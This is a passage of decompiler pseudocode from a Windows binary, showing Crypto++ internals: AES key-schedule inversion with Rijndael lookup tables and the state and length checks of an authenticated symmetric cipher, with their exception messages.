      }
      v35 += 4 * (a3 >> 2);
    }
    v36 = (unsigned __int32 *)this[7];
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(this[1] + 32))(this + 1) )
    {
      if ( !byte_4EFF00 )
        sub_457FF8();
      if ( !sub_458150(1) )
        sub_457947((int)v36, (int)v36, 0x10u);
      v24 = (int)&v36[4 * this[3]];
      if ( !sub_458150(1) )
        sub_457947(v24, v24, 0x10u);
    }
    else
    {
      if ( !byte_4EFF01 )
        sub_457DE7();
      v34 = 4;
      for ( i = 4 * this[3] - 4; v34 < i; i -= 4 )
      {
        v29 = *(int *)((char *)&dword_4EF700[2 * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[v34]]]
                     + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                         * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[v34])]]
                                   + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                       * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[v34])]]
                                                 + 1) ^ dword_4EF704[2
                                                                   * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[v34])]];
        v36[v34] = *(int *)((char *)&dword_4EF700[2 * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[i]]]
                          + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                              * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[i])]]
                                        + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                            * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[i])]]
                                                      + 1) ^ dword_4EF704[2
                                                                        * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[i])]];
        v36[i] = v29;
        v30 = *(int *)((char *)&dword_4EF700[2
                                           * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[v34 + 1]]]
                     + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                         * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[v34 + 1])]]
                                   + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                       * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[v34 + 1])]]
                                                 + 1) ^ dword_4EF704[2
                                                                   * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[v34 + 1])]];
        v36[v34 + 1] = *(int *)((char *)&dword_4EF700[2
                                                    * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[i + 1]]]
                              + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                                  * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[i + 1])]]
                                            + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                                * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[i + 1])]]
                                                          + 1) ^ dword_4EF704[2
                                                                            * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[i + 1])]];
        v36[i + 1] = v30;
        v31 = *(int *)((char *)&dword_4EF700[2
                                           * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[v34 + 2]]]
                     + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                         * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[v34 + 2])]]
                                   + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                       * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[v34 + 2])]]
                                                 + 1) ^ dword_4EF704[2
                                                                   * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[v34 + 2])]];
        v36[v34 + 2] = *(int *)((char *)&dword_4EF700[2
                                                    * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[i + 2]]]
                              + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                                  * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[i + 2])]]
                                            + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                                * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[i + 2])]]
                                                          + 1) ^ dword_4EF704[2
                                                                            * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[i + 2])]];
        v36[i + 2] = v31;
        v32 = *(int *)((char *)&dword_4EF700[2
                                           * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[v34 + 3]]]
                     + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                         * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[v34 + 3])]]
                                   + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                       * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[v34 + 3])]]
                                                 + 1) ^ dword_4EF704[2
                                                                   * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[v34 + 3])]];
        v36[v34 + 3] = *(int *)((char *)&dword_4EF700[2
                                                    * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[i + 3]]]
                              + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                                  * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[i + 3])]]
                                            + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                                * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[i + 3])]]
                                                          + 1) ^ dword_4EF704[2
                                                                            * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[i + 3])]];
        v36[i + 3] = v32;
        v34 += 4;
      }
      v36[v34] = *(int *)((char *)&dword_4EF700[2 * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[v34]]]
                        + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                            * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[v34])]]
                                      + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                          * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[v34])]]
                                                    + 1) ^ dword_4EF704[2
                                                                      * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[v34])]];
      v36[v34 + 1] = *(int *)((char *)&dword_4EF700[2
                                                  * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[v34 + 1]]]
                            + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                                * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[v34 + 1])]]
                                          + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                              * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[v34 + 1])]]
                                                        + 1) ^ dword_4EF704[2
                                                                          * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[v34 + 1])]];
      v36[v34 + 2] = *(int *)((char *)&dword_4EF700[2
                                                  * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[v34 + 2]]]
                            + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                                * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[v34 + 2])]]
                                          + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                              * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[v34 + 2])]]
                                                        + 1) ^ dword_4EF704[2
                                                                          * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[v34 + 2])]];
      v36[v34 + 3] = *(int *)((char *)&dword_4EF700[2
                                                  * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)v36[v34 + 3]]]
                            + 3) ^ *(int *)((char *)&dword_4EF700[2
                                                                * (unsigned __int8)RijnDael_AES_LONG_4BCE60[BYTE1(v36[v34 + 3])]]
                                          + 2) ^ *(int *)((char *)&dword_4EF700[2
                                                                              * (unsigned __int8)RijnDael_AES_LONG_4BCE60[(unsigned __int8)BYTE2(v36[v34 + 3])]]
                                                        + 1) ^ dword_4EF704[2
                                                                          * (unsigned __int8)RijnDael_AES_LONG_4BCE60[HIBYTE(v36[v34 + 3])]];
      v20 = *v36;
      if ( sub_458150(1) )
        v19 = v20;
      else
        v19 = sub_457DE0(v20);
      v18 = v36[4 * this[3]];
      if ( sub_458150(1) )
        v17 = v18;
      else
        v17 = sub_457DE0(v18);
      *v36 = v17;
      v36[4 * this[3]] = v19;
      v16 = v36[1];
      if ( sub_458150(1) )
        v15 = v16;
      else
        v15 = sub_457DE0(v16);
      v14 = v36[4 * this[3] + 1];
      if ( sub_458150(1) )
        v13 = v14;
      else
        v13 = sub_457DE0(v14);
      v36[1] = v13;
      v36[4 * this[3] + 1] = v15;
      v12 = v36[2];
      if ( sub_458150(1) )
        v11 = v12;
      else
        v11 = sub_457DE0(v12);
      v10 = v36[4 * this[3] + 2];
      if ( sub_458150(1) )
        v9 = v10;
      else
        v9 = sub_457DE0(v10);
      v36[2] = v9;
      v36[4 * this[3] + 2] = v11;
      v8 = v36[3];
      if ( sub_458150(1) )
        v7 = v8;
      else
        v7 = sub_457DE0(v8);
      v6 = v36[4 * this[3] + 3];
      if ( sub_458150(1) )
        v5 = v6;
      else
        v5 = sub_457DE0(v6);
      v36[3] = v5;
      v36[4 * this[3] + 3] = v7;
    }
    result = (unsigned __int8)sub_4580F0();
    if ( (_BYTE)result )
    {
      v22 = 16 * (this[3] - 1);
      v23 = v36 + 4;
      v21 = v36 + 4;
      if ( sub_458150(1) )
      {
        result = (int)(v36 + 4);
        if ( v23 != v21 )
          return sub_438F30(v21, v22, v23, v22);
      }
      else
      {
        return sub_457947((int)v21, (int)v23, v22);
      }
    }
  }
  return result;
}
// 4061D0: using guessed type _DWORD __stdcall nullsub_1(_DWORD);
// 4EF700: using guessed type int dword_4EF700[];
// 4EF704: using guessed type int dword_4EF704[511];
// 4EFF00: using guessed type char byte_4EFF00;
// 4EFF01: using guessed type char byte_4EFF01;

//----- (00459E90) --------------------------------------------------------
char *__thiscall sub_459E90(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::AuthenticatedSymmetricCipher::BadState::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BC0C4: using guessed type void *CryptoPP::AuthenticatedSymmetricCipher::BadState::`vftable';

//----- (00459F20) --------------------------------------------------------
char *__thiscall sub_459F20(char *this, size_t *a2, void *a3, void *a4)
{
  size_t *v5; // esi
  unsigned int v6; // eax
  void **v7; // eax
  void **v8; // eax
  void **v9; // eax
  void *v10; // ecx
  void *v11; // ecx
  void *v12; // ecx
  void *v13; // ecx
  __int128 v15; // [esp+20h] [ebp-70h] BYREF
  __int64 v16; // [esp+30h] [ebp-60h]
  void *v17[5]; // [esp+38h] [ebp-58h] BYREF
  unsigned int v18; // [esp+4Ch] [ebp-44h]
  __int128 v19; // [esp+50h] [ebp-40h] BYREF
  __int64 v20; // [esp+60h] [ebp-30h]
  __int128 v21; // [esp+68h] [ebp-28h] BYREF
  __int64 v22; // [esp+78h] [ebp-18h]
  int v23; // [esp+8Ch] [ebp-4h]

  v5 = a2;
  v23 = 0;
  v6 = a2[4] + 2;
  v17[4] = 0;
  v18 = 15;
  LOBYTE(v17[0]) = 0;
  sub_4196B0(v17, v6);
  if ( a2[5] >= 0x10 )
    v5 = (size_t *)*a2;
  sub_41F120((char *)v17, v5, a2[4]);
  sub_41F120((char *)v17, ": ", 2u);
  v7 = sub_41F120((char *)v17, a3, strlen((const char *)a3));
  v20 = 0i64;
  v19 = *(_OWORD *)v7;
  v20 = *((_QWORD *)v7 + 2);
  v7[4] = 0;
  v7[5] = (void *)15;
  *(_BYTE *)v7 = 0;
  LOBYTE(v23) = 1;
  v8 = sub_41F120((char *)&v19, " was called before ", 0x13u);
  v22 = 0i64;
  v21 = *(_OWORD *)v8;
  v22 = *((_QWORD *)v8 + 2);
  v8[4] = 0;
  v8[5] = (void *)15;
  *(_BYTE *)v8 = 0;
  LOBYTE(v23) = 2;
  v9 = sub_41F120((char *)&v21, a4, strlen((const char *)a4));
  v15 = *(_OWORD *)v9;
  v16 = *((_QWORD *)v9 + 2);
  v9[4] = 0;
  v9[5] = (void *)15;
  *(_BYTE *)v9 = 0;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v23) = 4;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 6;
  sub_419BE0((_DWORD *)this + 4, &v15);
  if ( HIDWORD(v16) >= 0x10 )
  {
    v10 = (void *)v15;
    if ( (unsigned int)(HIDWORD(v16) + 1) >= 0x1000 )
    {
      v10 = *(void **)(v15 - 4);
      if ( (unsigned int)(v15 - (_DWORD)v10 - 4) > 0x1F )
        goto LABEL_20;
    }
    sub_46C87D(v10);
  }
  if ( HIDWORD(v22) >= 0x10 )
  {
    v11 = (void *)v21;
    if ( (unsigned int)(HIDWORD(v22) + 1) >= 0x1000 )
    {
      v11 = *(void **)(v21 - 4);
      if ( (unsigned int)(v21 - (_DWORD)v11 - 4) > 0x1F )
        goto LABEL_20;
    }
    sub_46C87D(v11);
  }
  v22 = 0xF00000000i64;
  LOBYTE(v21) = 0;
  if ( HIDWORD(v20) >= 0x10 )
  {
    v12 = (void *)v19;
    if ( (unsigned int)(HIDWORD(v20) + 1) >= 0x1000 )
    {
      v12 = *(void **)(v19 - 4);
      if ( (unsigned int)(v19 - (_DWORD)v12 - 4) > 0x1F )
        goto LABEL_20;
    }
    sub_46C87D(v12);
  }
  v20 = 0xF00000000i64;
  LOBYTE(v19) = 0;
  if ( v18 >= 0x10 )
  {
    v13 = v17[0];
    if ( v18 + 1 < 0x1000 || (v13 = (void *)*((_DWORD *)v17[0] - 1), (unsigned int)(v17[0] - v13 - 4) <= 0x1F) )
    {
      sub_46C87D(v13);
      goto LABEL_19;
    }
LABEL_20:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_19:
  *(_DWORD *)this = &CryptoPP::AuthenticatedSymmetricCipher::BadState::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BC0C4: using guessed type void *CryptoPP::AuthenticatedSymmetricCipher::BadState::`vftable';

//----- (0045A1F0) --------------------------------------------------------
char *__thiscall sub_45A1F0(char *this, size_t *a2, void *a3)
{
  size_t *v4; // esi
  unsigned int v5; // eax
  void **v6; // eax
  void *v7; // ecx
  void *v8; // ecx
  __int128 v10; // [esp+1Ch] [ebp-40h] BYREF
  __int64 v11; // [esp+2Ch] [ebp-30h]
  void *v12[5]; // [esp+34h] [ebp-28h] BYREF
  unsigned int v13; // [esp+48h] [ebp-14h]
  int v14; // [esp+58h] [ebp-4h]

  v4 = a2;
  v14 = 0;
  v5 = a2[4] + 2;
  v12[4] = 0;
  v13 = 15;
  LOBYTE(v12[0]) = 0;
  sub_4196B0(v12, v5);
  if ( a2[5] >= 0x10 )
    v4 = (size_t *)*a2;
  sub_41F120((char *)v12, v4, a2[4]);
  sub_41F120((char *)v12, ": ", 2u);
  v6 = sub_41F120((char *)v12, a3, strlen((const char *)a3));
  v10 = *(_OWORD *)v6;
  v11 = *((_QWORD *)v6 + 2);
  v6[4] = 0;
  v6[5] = (void *)15;
  *(_BYTE *)v6 = 0;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v14) = 2;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 6;
  sub_419BE0((_DWORD *)this + 4, &v10);
  if ( HIDWORD(v11) >= 0x10 )
  {
    v7 = (void *)v10;
    if ( (unsigned int)(HIDWORD(v11) + 1) >= 0x1000 )
    {
      v7 = *(void **)(v10 - 4);
      if ( (unsigned int)(v10 - (_DWORD)v7 - 4) > 0x1F )
        goto LABEL_12;
    }
    sub_46C87D(v7);
  }
  if ( v13 >= 0x10 )
  {
    v8 = v12[0];
    if ( v13 + 1 < 0x1000 || (v8 = (void *)*((_DWORD *)v12[0] - 1), (unsigned int)(v12[0] - v8 - 4) <= 0x1F) )
    {
      sub_46C87D(v8);
      goto LABEL_11;
    }
LABEL_12:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_11:
  *(_DWORD *)this = &CryptoPP::AuthenticatedSymmetricCipher::BadState::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BC0C4: using guessed type void *CryptoPP::AuthenticatedSymmetricCipher::BadState::`vftable';

//----- (0045A380) --------------------------------------------------------
void __thiscall sub_45A380(_DWORD *this, char *Src, size_t Size)
{
  char *v3; // ebx
  size_t v5; // esi
  unsigned int v6; // eax
  char *v7; // ebp
  unsigned int v8; // edx
  int v9; // ecx
  int v10; // ecx
  int v11; // eax
  char *Srca; // [esp+Ch] [ebp+4h]

  v3 = Src;
  if ( Src )
  {
    v5 = Size;
    if ( Size )
    {
      v6 = (*(int (__thiscall **)(_DWORD *))(*this + 96))(this);
      v7 = (char *)this[6];
      v8 = v6;
      Srca = (char *)v6;
      if ( v7 )
      {
        v9 = this[14];
        if ( v9 )
        {
          if ( v9 + Size < v6 )
          {
            memmove(&v7[v9], v3, Size);
            this[14] += Size;
            return;
          }
          memmove(&v7[v9], v3, v6 - v9);
          (*(void (__thiscall **)(_DWORD *, char *, char *))(*this + 108))(this, v7, Srca);
          v8 = (unsigned int)Srca;
          v10 = this[14];
          this[14] = 0;
          v3 = &Srca[(_DWORD)v3 - v10];
          v5 = v10 - (_DWORD)Srca + Size;
        }
      }
      if ( v5 >= v8 )
      {
        v11 = (*(int (__thiscall **)(_DWORD *, char *, size_t))(*this + 108))(this, v3, v5);
        v3 += v5 - v11;
        v5 = v11;
      }
      if ( v7 )
      {
        if ( v5 )
          memmove(v7, v3, v5);
      }
      this[14] = v5;
    }
  }
}

//----- (0045A450) --------------------------------------------------------
void __thiscall sub_45A450(int *this, char *a2, char *a3, size_t a4)
{
  __int64 v5; // rax
  unsigned int v6; // ecx
  size_t v7; // eax
  unsigned int v8; // kr04_4
  int v9; // ecx
  int v10; // eax
  char v11; // bl
  char v12; // al
  int v13; // eax
  int v14; // eax
  char *v15; // eax
  _DWORD *v16; // eax
  size_t *v17; // eax
  size_t *v18; // eax
  unsigned int v19; // [esp+18h] [ebp-14h]
  unsigned int v20; // [esp+1Ch] [ebp-10h]
  char v21[24]; // [esp+2Ch] [ebp+0h] BYREF
  char v22[24]; // [esp+44h] [ebp+18h] BYREF
  char v23[40]; // [esp+5Ch] [ebp+30h] BYREF
  char v24[24]; // [esp+84h] [ebp+58h] BYREF
  char pExceptionObject[40]; // [esp+9Ch] [ebp+70h] BYREF

  v20 = this[8];
  v19 = this[9];
  if ( this[13] < 2 )
  {
    v6 = this[8];
  }
  else
  {
    v5 = ((__int64 (__thiscall *)(int *))*(_DWORD *)(*(this - 2) + 64))(this - 2);
    v6 = v20;
    if ( a4 > v5 - __PAIR64__(v19, v20) )
    {
      v15 = (char *)(*(int (__thiscall **)(int *, char *))(*(this - 1) + 8))(this - 1, v22);
      v16 = (_DWORD *)sub_421F20((int)v24, v15, ": message length exceeds maximum");
      sub_405230(pExceptionObject, v16);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
  }
  v8 = v6;
  v7 = v6 + a4;
  v9 = this[13];
  this[8] = v7;
  this[9] = (__PAIR64__(v19, v8) + a4) >> 32;
  switch ( v9 )
  {
    case 0:
    case 1:
LABEL_10:
      v17 = (size_t *)(*(int (__thiscall **)(int *, char *))(*(this - 1) + 8))(this - 1, v24);
      sub_459F20(pExceptionObject, v17, "ProcessData", "setting key and IV");
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVBadState_AuthenticatedSymmetricCipher_CryptoPP__);
    case 2:
      while ( 2 )
      {
        (*(void (__thiscall **)(int *))(*(this - 2) + 112))(this - 2);
        v10 = *this;
        this[12] = 0;
        v11 = (*(int (__thiscall **)(int *))(v10 + 60))(this);
        v12 = (*(int (__thiscall **)(int *))(*(this - 2) + 92))(this - 2);
        this[13] = (v12 != v11) + 3;
        switch ( v12 != v11 )
        {
          case 0xFD:
          case 0xFE:
            goto LABEL_10;
          case 0xFF:
            continue;
          case 0:
            goto LABEL_7;
          case 1:
            goto LABEL_8;
          case 2:
            goto LABEL_11;
        }
      }
    case 3:
LABEL_7:
      sub_45A380(this - 2, a3, a4);
      v13 = (*(int (__thiscall **)(int *))(*(this - 2) + 88))(this - 2);
      (*(void (__thiscall **)(int, char *, char *, size_t))(*(_DWORD *)(v13 + 4) + 32))(v13 + 4, a2, a3, a4);
      break;
    case 4:
LABEL_8:
      v14 = (*(int (__thiscall **)(int *))(*(this - 2) + 88))(this - 2);
      (*(void (__thiscall **)(int, char *, char *, size_t))(*(_DWORD *)(v14 + 4) + 32))(v14 + 4, a2, a3, a4);
      sub_45A380(this - 2, a2, a4);
      break;
    case 5:
LABEL_11:
      v18 = (size_t *)(*(int (__thiscall **)(int *, char *))(*(this - 1) + 8))(this - 1, v21);
      sub_45A1F0(v23, v18, "ProcessData was called after footer input has started");
      _CxxThrowException(v23, (_ThrowInfo *)&_TI3_AVBadState_AuthenticatedSymmetricCipher_CryptoPP__);
    default:
      return;
  }
}
// 45A4CE: conditional instruction was optimized away because esi.4==0
// 45A450: using guessed type char var_84[24];
// 45A450: using guessed type char var_9C[24];

//----- (0045A680) --------------------------------------------------------
int __thiscall sub_45A680(int *this, int a2, unsigned int a3)
{
  int v4; // esi
  int v5; // eax
  int result; // eax
  size_t *v7; // eax
  char v8[24]; // [esp+10h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+28h] [ebp-38h] BYREF
  int v10; // [esp+5Ch] [ebp-4h]

  if ( this[15] < 1 )
  {
    v7 = (size_t *)(*(int (__thiscall **)(int *, char *))(this[1] + 8))(this + 1, v8);
    v10 = 0;
    sub_459F20(pExceptionObject, v7, "Resynchronize", "key is set");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVBadState_AuthenticatedSymmetricCipher_CryptoPP__);
  }
  v4 = *this;
  this[14] = 0;
  this[12] = 0;
  this[13] = 0;
  this[10] = 0;
  this[11] = 0;
  this[8] = 0;
  this[9] = 0;
  this[15] = 1;
  v5 = sub_4386B0(this, a3);
  result = (*(int (__thiscall **)(int *, int, int))(v4 + 104))(this, a2, v5);
  this[15] = 2;
  return result;
}
// 45A680: using guessed type char var_50[24];

//----- (0045A760) --------------------------------------------------------
int __thiscall sub_45A760(_DWORD *this, int a2, int a3, int *a4)
{
  int v5; // eax
  int result; // eax
  int v7; // [esp-8h] [ebp-Ch]
  int *v8; // [esp-4h] [ebp-8h]

  v8 = a4;
  v7 = a3;
  v5 = *this;
  this[14] = 0;
  this[15] = 0;
  (*(void (__stdcall **)(int, int, int *))(v5 + 100))(a2, v7, v8);
  this[15] = 1;
  result = sub_4372C0(this, a4, &a3);
  if ( result )
    return (*(int (__thiscall **)(_DWORD *, int, int))(*this + 44))(this, result, a3);
  return result;
}

//----- (0045A7B0) --------------------------------------------------------
int __thiscall sub_45A7B0(_DWORD *this, int a2, int a3)
{
  unsigned __int64 v4; // rax
  int v5; // edi
  unsigned __int64 v6; // rax
  char *v7; // eax
  _DWORD *v8; // eax
  unsigned __int64 v9; // rax
  char *v10; // edi
  char *v11; // esi
  int v12; // edx
  char *v13; // eax
  int v14; // eax
  char *v15; // eax
  int v16; // eax
  int result; // eax
  size_t *v18; // eax
  unsigned __int64 v19; // rax
  char *v20; // edi
  char *v21; // esi
  int v22; // edx
  char *v23; // eax
  int v24; // eax
  char *v25; // eax
  int v26; // eax
  unsigned __int64 v27; // [esp-1Ch] [ebp-150h]
  unsigned __int64 v28; // [esp-1Ch] [ebp-150h]
  char v29[24]; // [esp+14h] [ebp-120h] BYREF
  char pExceptionObject[40]; // [esp+2Ch] [ebp-108h] BYREF
  char v31[24]; // [esp+54h] [ebp-E0h] BYREF
  char v32[24]; // [esp+6Ch] [ebp-C8h] BYREF
  char v33[24]; // [esp+84h] [ebp-B0h] BYREF
  char v34[24]; // [esp+9Ch] [ebp-98h] BYREF
  char v35[24]; // [esp+B4h] [ebp-80h] BYREF
  char v36[24]; // [esp+CCh] [ebp-68h] BYREF
  char v37[24]; // [esp+E4h] [ebp-50h] BYREF
  char v38[40]; // [esp+FCh] [ebp-38h] BYREF
  int v39; // [esp+130h] [ebp-4h]

  LODWORD(v4) = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 60))(this - 1);
  v5 = *(this - 1);
  if ( *(_QWORD *)(this + 7) > v4 )
  {
    v19 = ((__int64 (__thiscall *)(_DWORD *))*(_DWORD *)(v5 + 60))(this - 1);
    v20 = (char *)sub_43D030((int)v35, v19, 0xAu);
    HIDWORD(v28) = this[8];
    v39 = 0;
    LODWORD(v28) = this[7];
    v21 = (char *)sub_43D030((int)v34, v28, 0xAu);
    v22 = *this;
    LOBYTE(v39) = 1;
    v23 = (char *)(*(int (__thiscall **)(_DWORD *, char *))(v22 + 8))(this, v33);
    LOBYTE(v39) = 2;
    v24 = sub_421F20((int)v32, v23, ": header length of ");
    LOBYTE(v39) = 3;
    v25 = (char *)sub_4220E0((int)v31, v24, v21);
    LOBYTE(v39) = 4;
    v26 = sub_421F20((int)v37, v25, " exceeds the maximum of ");
    LOBYTE(v39) = 5;
    v8 = (_DWORD *)sub_4220E0((int)v36, v26, v20);
    LOBYTE(v39) = 6;
    goto LABEL_13;
  }
  LODWORD(v6) = (*(int (__thiscall **)(_DWORD *))(v5 + 68))(this - 1);
  if ( *(_QWORD *)(this + 11) > v6 )
  {
    if ( ((__int64 (__thiscall *)(_DWORD *))*(_DWORD *)(*(this - 1) + 68))(this - 1) )
    {
      v9 = ((__int64 (__thiscall *)(_DWORD *))*(_DWORD *)(*(this - 1) + 68))(this - 1);
      v10 = (char *)sub_43D030((int)v36, v9, 0xAu);
      HIDWORD(v27) = this[12];
      v39 = 9;
      LODWORD(v27) = this[11];
      v11 = (char *)sub_43D030((int)v37, v27, 0xAu);
      v12 = *this;
      LOBYTE(v39) = 10;
      v13 = (char *)(*(int (__thiscall **)(_DWORD *, char *))(v12 + 8))(this, v31);
      LOBYTE(v39) = 11;
      v14 = sub_421F20((int)v32, v13, ": footer length of ");
      LOBYTE(v39) = 12;
      v15 = (char *)sub_4220E0((int)v33, v14, v11);
      LOBYTE(v39) = 13;
      v16 = sub_421F20((int)v34, v15, " exceeds the maximum of ");
      LOBYTE(v39) = 14;
      v8 = (_DWORD *)sub_4220E0((int)v35, v16, v10);
      LOBYTE(v39) = 15;
    }
    else
    {
      v7 = (char *)(*(int (__thiscall **)(_DWORD *, char *))(*this + 8))(this, v36);
      v39 = 7;
      v8 = (_DWORD *)sub_421F20(
                       (int)v37,
                       v7,
                       ": additional authenticated data (AAD) cannot be input after data to be encrypted or decrypted");
      LOBYTE(v39) = 8;
    }
LABEL_13:
    sub_405230(v38, v8);
    _CxxThrowException(v38, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  result = this[14];
  switch ( result )
  {
    case 0:
    case 1:
      v18 = (size_t *)(*(int (__thiscall **)(_DWORD *, char *))(*this + 8))(this, v29);
      v39 = 16;
      sub_459F20(pExceptionObject, v18, "TruncatedFinal", "setting key and IV");
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVBadState_AuthenticatedSymmetricCipher_CryptoPP__);
    case 2:
      (*(void (__thiscall **)(_DWORD *))(*(this - 1) + 112))(this - 1);
      this[13] = 0;
      goto LABEL_9;
    case 3:
    case 4:
LABEL_9:
      (*(void (__thiscall **)(_DWORD *))(*(this - 1) + 116))(this - 1);
      this[13] = 0;
      goto LABEL_10;
    case 5:
LABEL_10:
      result = (*(int (__thiscall **)(_DWORD *, int, int))(*(this - 1) + 120))(this - 1, a2, a3);
      this[13] = 0;
      break;
    default:
      break;
  }
  this[14] = 1;
  return result;
}
// 45A805: variable 'v4' is possibly undefined
// 45A821: variable 'v6' is possibly undefined
// 45A7B0: using guessed type char var_120[24];

//----- (0045AA80) --------------------------------------------------------
void __thiscall sub_45AA80(char *this, char *a2, size_t a3)
{
  size_t *v4; // eax
  char v5[24]; // [esp+10h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+28h] [ebp-38h] BYREF
  int v7; // [esp+5Ch] [ebp-4h]

  if ( a3 )
  {
    switch ( *((_DWORD *)this + 14) )
    {
      case 0:
      case 1:
        v4 = (size_t *)(*(int (__thiscall **)(char *, char *))(*(_DWORD *)this + 8))(this, v5);
        v7 = 0;
        sub_459F20(pExceptionObject, v4, "Update", "setting key and IV");
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVBadState_AuthenticatedSymmetricCipher_CryptoPP__);
      case 2:
        sub_45A380((_DWORD *)this - 1, a2, a3);
        *(_QWORD *)(this + 28) += a3;
        return;
      case 3:
      case 4:
